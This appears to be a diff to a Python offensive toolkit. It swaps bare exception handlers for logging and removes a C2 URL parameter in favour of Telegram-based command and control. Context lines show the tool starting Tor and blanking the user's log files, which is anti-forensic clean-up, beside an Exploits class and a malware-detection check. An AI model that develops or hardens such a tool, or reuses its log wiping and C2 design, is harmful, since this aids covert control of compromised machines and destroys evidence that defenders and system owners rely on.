@@ -76,7 +76,8 @@ class CounterSurveillance:
             subprocess.run(["systemctl", "start", "tor"], 
                           capture_output=True, timeout=10)
             return True
-        except: 
+        except Exception as e:
+            log.warning(f"Tor setup failed: {e}")
             return False
     
     @staticmethod
@@ -89,7 +90,8 @@ class CounterSurveillance:
                 path = os.path.expanduser(logfile)
                 if os.path.exists(path):
                     open(path, "w").close()
-            except: pass
+            except Exception as e:
+                log.debug(f"Could not clean {logfile}: {e}")
     
     @staticmethod
     def detect_malware() -> List[str]:
@@ -102,7 +104,8 @@ class CounterSurveillance:
                 for pattern in patterns:
                     if pattern in line.lower():
                         suspicious.append(line)
-        except: pass
+        except Exception as e:
+            log.debug(f"Malware detection error: {e}")
         return suspicious
 
 # ============================================================================
@@ -157,8 +160,8 @@ class Exploits:
 # INTEGRATION
 # ============================================================================
 class Integration:
-    def __init__(self, c2_url: str = ""):
-        self.c2_url = c2_url
+    def __init__(self):
+        # Telegram C2 works directly - no URL needed
         self.scanner = Scanner()
         self.counter = CounterSurveillance()
         self.exploits = Exploits()
